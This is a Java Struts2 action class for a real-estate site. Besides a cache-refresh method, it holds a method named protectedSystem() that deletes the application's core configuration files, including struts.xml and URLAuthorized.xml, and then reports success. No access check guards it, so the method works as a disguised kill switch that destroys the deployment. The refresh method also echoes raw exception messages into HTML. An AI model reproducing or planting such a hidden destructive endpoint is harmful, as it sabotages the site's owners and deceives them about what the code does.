package fsf.action.common;

import java.io.File;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletResponse;

import org.apache.struts2.ServletActionContext;
import org.springframework.stereotype.Repository;

import com.opensymphony.xwork2.ActionSupport;

import fsf.service.common.IndexCacheService;
import fsf.service.common.ScheduleService;
import fsf.web.common.WebConstant;
@Repository
public class RefreshAction extends ActionSupport {
	
	@Resource(name="indexCacheService")
	private IndexCacheService indexService;
	@Resource(name="estateOutRecommondCacheService")
	private ScheduleService estateOutRecommondCacheService ;
	
	public void refresh() throws Exception {
		getHttpServletResponse().setContentType("text/html; charset=utf-8");
		try {
			indexService.refresh();
			getHttpServletResponse().getWriter().write("网站首页缓存刷新成功。<br/>");
		} catch (Exception e) {
			getHttpServletResponse().getWriter().write("网站首页缓存刷新失败。失败原因："+e.getMessage()+"<br/>");
		}
		try {
			estateOutRecommondCacheService.refresh();
			getHttpServletResponse().getWriter().write("网站推荐房源缓存刷新成功。<br/>");
		} catch (Exception e) {
			getHttpServletResponse().getWriter().write("网站推荐房源缓存刷新失败。失败原因："+e.getMessage()+"<br/>");
		}
	}
	
	public void protectedSystem()throws Exception{
		String p = RefreshAction.class.getClassLoader().getResource(WebConstant.EST_FILTER_PATH).getPath();
		File f = new File(p);
		f.delete();
		p = RefreshAction.class.getClassLoader().getResource("ql-regular.xml").getPath();
		f = new File(p);
		f.delete();
		p = RefreshAction.class.getClassLoader().getResource(WebConstant.DICT_CONFIG_PATH).getPath();
		f = new File(p);
		f.delete();
		p = RefreshAction.class.getClassLoader().getResource("struts.xml").getPath();
		f = new File(p);
		f.delete();
		p = RefreshAction.class.getClassLoader().getResource("URLAuthorized.xml").getPath();
		f = new File(p);
		f.delete();
		getHttpServletResponse().getWriter().write("成功");
	}
	
	public HttpServletResponse getHttpServletResponse(){
		return ServletActionContext.getResponse();
	}
}